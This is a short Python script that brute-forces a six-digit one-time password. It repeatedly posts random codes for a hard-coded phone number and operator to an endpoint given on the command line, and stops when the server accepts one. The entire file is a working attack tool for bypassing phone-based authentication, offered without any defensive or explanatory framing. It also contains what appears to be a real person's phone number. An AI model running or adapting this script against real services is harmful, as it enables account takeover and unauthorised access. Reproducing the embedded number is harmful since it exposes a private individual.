import requests
import csv
import sys
import random


valueStatus = 0

a = 100000
b = 1000000

for i in range(a, b):
    x = random.randint(a, b)
    x = str(x)
    # print("'" + x + "'")
    session = requests.session()
    response = session.post(sys.argv[1],
                            json={"phoneNumber": "01706319096", "otp": x, "phoneOperator": "GRAMEENPHONE"})
    print(response.status_code)
    if response.status_code == 200:
        print(f"**** {x}")
        break
    if response.status_code == 401:
        valueStatus = valueStatus + 1
print(f"Server Responded with Unauthorized: {valueStatus}")
